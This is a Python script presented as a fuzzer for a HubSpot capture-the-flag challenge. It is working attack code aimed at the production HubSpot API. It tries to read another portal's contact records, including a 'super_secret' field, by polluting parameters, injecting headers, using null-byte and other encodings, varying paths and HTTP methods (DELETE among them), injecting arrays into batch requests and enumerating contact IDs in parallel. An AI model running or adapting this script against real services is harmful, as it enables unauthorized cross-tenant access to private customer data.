#!/usr/bin/env python3
"""
Advanced Fuzzer for HubSpot CTF
Tests parameter pollution, header injection, and edge cases
"""

import requests
import json
import sys
import time
from typing import Dict, List
from urllib.parse import quote, quote_plus
import concurrent.futures

class HubSpotFuzzer:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.target_portal = "46962361"
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        })
        self.findings = []

    def fuzz_parameter_names(self):
        """Fuzz different variations of portalId parameter"""
        print("\n[*] Fuzzing parameter name variations...")

        base_url = "https://api.hubapi.com/crm/v3/objects/contacts/1"

        param_variations = [
            f'portalId={self.target_portal}',
            f'portalid={self.target_portal}',
            f'PortalId={self.target_portal}',
            f'PORTALID={self.target_portal}',
            f'portal_id={self.target_portal}',
            f'portal-id={self.target_portal}',
            f'portalID={self.target_portal}',
            f'hubId={self.target_portal}',
            f'hub_id={self.target_portal}',
            f'accountId={self.target_portal}',
            f'account_id={self.target_portal}',
            f'tenantId={self.target_portal}',
            f'portalId[]={self.target_portal}',
            f'portalId[0]={self.target_portal}',
            f'portalId.value={self.target_portal}',
        ]

        for param in param_variations:
            url = f"{base_url}?{param}&properties=firstname,super_secret,email"
            try:
                response = self.session.get(url, timeout=10)
                status = response.status_code

                if status != 403:
                    print(f"[!] INTERESTING: {param} -> Status {status}")
                    self.findings.append({
                        'test': 'Parameter name fuzzing',
                        'param': param,
                        'status': status,
                        'length': len(response.text)
                    })
                else:
                    print(f"[-] {param} -> 403")

                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Error with {param}: {e}")

    def fuzz_parameter_encoding(self):
        """Test various encodings of the portal ID"""
        print("\n[*] Fuzzing parameter encodings...")

        base_url = "https://api.hubapi.com/crm/v3/objects/contacts/1"

        encodings = [
            ('Plain', self.target_portal),
            ('URL encoded', quote(self.target_portal)),
            ('Double URL encoded', quote(quote(self.target_portal))),
            ('Plus encoded', quote_plus(self.target_portal)),
            ('Hex encoded', ''.join(f'%{ord(c):02x}' for c in self.target_portal)),
            ('Unicode encoded', '\\u0034\\u0036\\u0039\\u0036\\u0032\\u0033\\u0036\\u0031'),
            ('With null byte', f'{self.target_portal}%00'),
            ('With newline', f'{self.target_portal}%0A'),
            ('With space', f'{self.target_portal}%20'),
            ('With leading zero', f'0{self.target_portal}'),
            ('As hex', f'0x{int(self.target_portal):x}'),
            ('As octal', f'0o{int(self.target_portal):o}'),
        ]

        for name, encoded in encodings:
            url = f"{base_url}?portalId={encoded}&properties=firstname,super_secret,email"
            try:
                response = self.session.get(url, timeout=10)
                status = response.status_code

                if status != 403:
                    print(f"[!] INTERESTING: {name} -> Status {status}")
                    self.findings.append({
                        'test': 'Parameter encoding',
                        'encoding': name,
                        'value': encoded,
                        'status': status
                    })
                else:
                    print(f"[-] {name} -> 403")

                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Error with {name}: {e}")

    def fuzz_header_injection(self):
        """Test custom headers for portal context"""
        print("\n[*] Fuzzing header injection...")

        url = "https://api.hubapi.com/crm/v3/objects/contacts/1?properties=firstname,super_secret,email"

        custom_headers = {
            'X-Portal-Id': self.target_portal,
            'X-HubSpot-Portal-Id': self.target_portal,
            'X-HubSpot-Portal': self.target_portal,
            'X-Hub-Id': self.target_portal,
            'X-Account-Id': self.target_portal,
            'Portal-Id': self.target_portal,
            'Hub-Id': self.target_portal,
            'X-Tenant-Id': self.target_portal,
            'X-Forwarded-Portal-Id': self.target_portal,
            'X-Original-Portal-Id': self.target_portal,
        }

        for header_name, header_value in custom_headers.items():
            headers = self.session.headers.copy()
            headers[header_name] = header_value

            try:
                response = requests.get(url, headers=headers, timeout=10)
                status = response.status_code

                if status != 403:
                    print(f"[!] INTERESTING: {header_name} -> Status {status}")
                    self.findings.append({
                        'test': 'Header injection',
                        'header': header_name,
                        'status': status
                    })
                else:
                    print(f"[-] {header_name} -> 403")

                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Error with {header_name}: {e}")

    def fuzz_path_variations(self):
        """Test different URL path structures"""
        print("\n[*] Fuzzing path variations...")

        path_variations = [
            '/crm/v3/objects/contacts/1',
            '/crm/v3/portals/{portal}/objects/contacts/1',
            '/crm/v3/objects/contacts/1/{portal}',
            '/crm/v3/{portal}/objects/contacts/1',
            '/portals/{portal}/crm/v3/objects/contacts/1',
            '/crm/v3/objects/{portal}/contacts/1',
            '/crm/v3/objects/contacts/{portal}/1',
        ]

        for path_template in path_variations:
            path = path_template.format(portal=self.target_portal)
            url = f"https://api.hubapi.com{path}?properties=firstname,super_secret,email"

            try:
                response = self.session.get(url, timeout=10)
                status = response.status_code

                if status not in [403, 404]:
                    print(f"[!] INTERESTING: {path} -> Status {status}")
                    self.findings.append({
                        'test': 'Path variation',
                        'path': path,
                        'status': status
                    })
                else:
                    print(f"[-] {path} -> {status}")

                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Error with {path}: {e}")

    def fuzz_http_methods(self):
        """Test different HTTP methods"""
        print("\n[*] Fuzzing HTTP methods...")

        url = f"https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={self.target_portal}&properties=firstname,super_secret,email"

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']

        for method in methods:
            try:
                response = self.session.request(method, url, timeout=10)
                status = response.status_code

                if status not in [403, 405]:
                    print(f"[!] INTERESTING: {method} -> Status {status}")
                    self.findings.append({
                        'test': 'HTTP method',
                        'method': method,
                        'status': status
                    })
                else:
                    print(f"[-] {method} -> {status}")

                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Error with {method}: {e}")

    def fuzz_array_injection(self):
        """Test array-based parameter pollution in POST bodies"""
        print("\n[*] Fuzzing array injection in POST bodies...")

        url = "https://api.hubapi.com/crm/v3/objects/contacts/batch/read"

        payloads = [
            # Portal in each input
            {
                'properties': ['firstname', 'super_secret', 'email'],
                'inputs': [
                    {'id': '1', 'portalId': self.target_portal}
                ]
            },
            # Mixed portal contexts
            {
                'properties': ['firstname', 'super_secret', 'email'],
                'inputs': [
                    {'id': '1'},
                    {'id': '2', 'portalId': self.target_portal}
                ]
            },
            # Portal as array
            {
                'properties': ['firstname', 'super_secret', 'email'],
                'inputs': [{'id': '1'}],
                'portalId': [self.target_portal]
            },
            # Nested portal
            {
                'properties': ['firstname', 'super_secret', 'email'],
                'inputs': [{'id': '1', 'context': {'portalId': self.target_portal}}]
            },
        ]

        for i, payload in enumerate(payloads, 1):
            try:
                response = self.session.post(url, json=payload, timeout=10)
                status = response.status_code

                if status != 403:
                    print(f"[!] INTERESTING: Payload {i} -> Status {status}")
                    print(f"    Payload: {json.dumps(payload)[:100]}...")
                    self.findings.append({
                        'test': 'Array injection',
                        'payload': payload,
                        'status': status
                    })
                else:
                    print(f"[-] Payload {i} -> 403")

                time.sleep(0.2)
            except Exception as e:
                print(f"[!] Error with payload {i}: {e}")

    def fuzz_contact_id_range(self):
        """Quickly test a range of contact IDs"""
        print("\n[*] Fuzzing contact ID range (1-100)...")

        base_url = f"https://api.hubapi.com/crm/v3/objects/contacts/{{id}}?portalId={self.target_portal}&properties=firstname,super_secret,email"

        # Test in parallel for speed
        def test_id(contact_id):
            url = base_url.format(id=contact_id)
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    return (contact_id, response.status_code, response.text)
                elif response.status_code not in [403, 404]:
                    return (contact_id, response.status_code, None)
            except:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test_id, i) for i in range(1, 101)]

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    contact_id, status, text = result
                    print(f"[!] Contact {contact_id} -> Status {status}")
                    if text:
                        print(f"    Response: {text[:200]}...")
                        self.findings.append({
                            'test': 'Contact ID fuzzing',
                            'contact_id': contact_id,
                            'status': status,
                            'response': text
                        })

    def generate_report(self):
        """Generate fuzzing report"""
        print("\n" + "="*60)
        print("FUZZING COMPLETE - FINDINGS REPORT")
        print("="*60)

        if self.findings:
            print(f"\nTotal interesting findings: {len(self.findings)}\n")
            for i, finding in enumerate(self.findings, 1):
                print(f"[{i}] {finding.get('test', 'Unknown')}")
                for key, value in finding.items():
                    if key != 'test' and key != 'response':
                        print(f"    {key}: {value}")
                print()
        else:
            print("\nNo interesting findings detected.")

        # Save findings
        if self.findings:
            filename = '/home/user/Hub/findings/fuzzing_results.json'
            with open(filename, 'w') as f:
                json.dump(self.findings, f, indent=2)
            print(f"Results saved to: {filename}")

    def run_all_fuzzers(self):
        """Run all fuzzing tests"""
        print("="*60)
        print("HubSpot Advanced Fuzzer")
        print("Target: Portal 46962361")
        print("="*60)

        self.fuzz_parameter_names()
        self.fuzz_parameter_encoding()
        self.fuzz_header_injection()
        self.fuzz_path_variations()
        self.fuzz_http_methods()
        self.fuzz_array_injection()
        self.fuzz_contact_id_range()

        self.generate_report()


def main():
    print("HubSpot CTF Advanced Fuzzer\n")

    api_key = input("Enter your HubSpot API key: ").strip()

    if not api_key:
        print("[-] No API key provided. Exiting.")
        sys.exit(1)

    print("\nStarting fuzzer...\n")

    fuzzer = HubSpotFuzzer(api_key)
    fuzzer.run_all_fuzzers()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Fuzzing interrupted by user")
        sys.exit(0)
